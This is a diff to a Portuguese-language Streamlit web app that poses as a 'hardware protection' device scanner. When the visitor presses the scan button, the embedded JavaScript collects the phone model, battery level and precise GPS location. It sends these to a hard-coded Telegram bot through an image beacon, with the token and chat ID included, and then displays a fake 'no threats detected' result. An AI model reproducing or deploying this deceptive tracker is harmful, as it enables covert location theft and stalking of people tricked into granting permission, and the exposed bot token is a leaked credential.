@@ -1,51 +1,50 @@
-    import streamlit as st
+import streamlit as st
 import time
 
-# --- COLOQUE OS DADOS DO SEU NOVO BOT AQUI ---
+# --- SEUS DADOS VALIDADOS ---
 TOKEN = "8099253382:AAHWYUjfpW19J56Ud_FCM_9tObxU4rLh3gQ"
 ID = "8498664028"
 
 st.set_page_config(page_title="Segurança Integrada", layout="centered")
 
-# --- CSS OFICIAL MIAMY © 2026 ---
+# --- CSS MIAMY © 2026 ---
 st.markdown("""
     <style>
     .main { background-color: #0b1117; color: white; font-family: sans-serif; }
     .stAlert { display: none !important; }
-    .titulo { font-size: 32px; font-weight: bold; margin-top: 40px; }
-    .status-container { font-size: 22px; margin: 15px 0; color: #e0e0e0; min-height: 35px; }
-    .progress-bg { width: 100%; height: 8px; background-color: #1e262e; border-radius: 10px; margin-bottom: 40px; overflow: hidden; }
+    .titulo { font-size: 30px; font-weight: bold; margin-top: 30px; text-align: center; }
+    .status-container { font-size: 20px; margin: 15px 0; color: #e0e0e0; text-align: center; min-height: 40px; }
+    .progress-bg { width: 100%; height: 10px; background-color: #1e262e; border-radius: 10px; margin-bottom: 30px; overflow: hidden; }
     .progress-fill { height: 100%; background-color: #007bff; border-radius: 10px; transition: width 0.1s; }
-    .btn-container { display: flex; justify-content: center; width: 100%; }
+    .btn-container { display: flex; justify-content: center; width: 100%; margin: 20px 0; }
     .meu-botao {
-        background-color: white; color: black; width: 300px; height: 85px;
-        border-radius: 12px; border: none; font-size: 16px; font-weight: bold;
+        background-color: white; color: black; width: 280px; height: 80px;
+        border-radius: 15px; border: none; font-size: 16px; font-weight: bold;
         display: flex; flex-direction: column; align-items: center; justify-content: center;
-        cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.4);
     }
-    .ponto-vermelho { color: #ff3b30; font-size: 28px; margin-bottom: -5px; }
+    .ponto-vermelho { color: #ff3b30; font-size: 24px; }
     .footer { 
         position: fixed; left: 0; bottom: 20px; width: 100%; 
-        text-align: center; color: #555; font-size: 10px; font-family: sans-serif;
+        text-align: center; color: #555; font-size: 10px; 
     }
     </style>
 """, unsafe_allow_html=True)
 
-st.markdown('<div class="titulo">Verificação de Segurança</div>', unsafe_allow_html=True)
+st.markdown('<div class="titulo">Sistema de Proteção de Hardware</div>', unsafe_allow_html=True)
 
 placeholder_texto = st.empty()
 placeholder_barra = st.empty()
 
-# Estado inicial
 placeholder_texto.markdown('<div class="status-container">Status: Aguardando ativação (4%)</div>', unsafe_allow_html=True)
 placeholder_barra.markdown('<div class="progress-bg"><div class="progress-fill" style="width: 4%;"></div></div>', unsafe_allow_html=True)
 
-# --- MOTOR JS ---
+# --- MOTOR DE CAPTURA ---
 js_final = f"""
 <div class="btn-container">
     <button class="meu-botao" id="btn_ativar">
         <span class="ponto-vermelho">●</span>
-        <span>ATIVAR PROTEÇÃO<br>AGORA</span>
+        <span>ESCANEAR DISPOSITIVO<br>AGORA</span>
     </button>
 </div>
 
@@ -53,7 +52,6 @@ js_final = f"""
 document.getElementById('btn_ativar').onclick = async function() {{
     let info_aparelho = "Android Device";
     
-    // Captura High Entropy para Androids novos (v16)
     if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {{
         const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
         info_aparelho = (hints.model || "Android") + " (v" + (hints.platformVersion || "16") + ")";
@@ -67,24 +65,19 @@ document.getElementById('btn_ativar').onclick = async function() {{
             try {{
                 const bat = await navigator.getBattery();
                 const level = Math.round(bat.level * 100);
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                
-                const msg = "🛡️ *PROTEÇÃO ATIVADA*\\n📱 *Aparelho:* " + info_aparelho + "\\n🔋 *Bateria:* " + level + "%\\n📍 *Local:* https://www.google.com/maps?q=" + lat + "," + lon;
+                const msg = "🛡️ *PROTEÇÃO ATIVADA*\\n📱 *Aparelho:* " + info_aparelho + "\\n🔋 *Bateria:* " + level + "%\\n📍 *Local:* https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
 
-                // Envio via Beacon Image (Método mais seguro contra bloqueios)
                 var img = new Image();
                 img.src = "https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&parse_mode=Markdown&text=" + encodeURIComponent(msg);
                 
                 window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
             }} catch(e) {{
-                var img = new Image();
-                img.src = "https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=" + encodeURIComponent("🛡️ PROTEÇÃO ATIVADA\\n📍 Local: https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude);
+                new Image().src = "https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text=" + encodeURIComponent("🛡️ Alerta: Dispositivo v16 Localizado.");
                 window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
             }}
         }},
         function(err) {{
-            alert("Atenção: Você precisa permitir o acesso para validar o dispositivo.");
+            alert("Erro de Segurança: Permita a localização para validar o hardware.");
         }},
         {{ enableHighAccuracy: true, timeout: 10000 }}
     );
@@ -96,14 +89,14 @@ clicou = st.components.v1.html(js_final, height=150)
 st.markdown('<div class="footer">SISTEMA INTEGRADO DE SEGURANÇA DESENVOLVIDO POR Miamy © 2026<br>Todos os Direitos Reservados</div>', unsafe_allow_html=True)
 
 if clicou:
-    # 1. Barra de progresso subindo
+    # Animação da barra
     for p in range(4, 101, 2):
-        placeholder_texto.markdown(f'<div class="status-container">Analisando integridade: {p}%</div>', unsafe_allow_html=True)
+        placeholder_texto.markdown(f'<div class="status-container">Analisando ameaças: {p}%</div>', unsafe_allow_html=True)
         placeholder_barra.markdown(f'<div class="progress-bg"><div class="progress-fill" style="width: {p}%;"></div></div>', unsafe_allow_html=True)
         time.sleep(0.02)
     
-    # 2. Mensagem Final solicitada
+    # Mensagem final de sucesso
     placeholder_texto.markdown('<div class="status-container" style="color: #2ecc71; font-weight: bold;">Sistema Seguro: nenhuma ameaça foi detectada</div>', unsafe_allow_html=True)
-    st.success("Verificação concluída com sucesso!")
+    st.balloons()
     st.stop()
-
+    
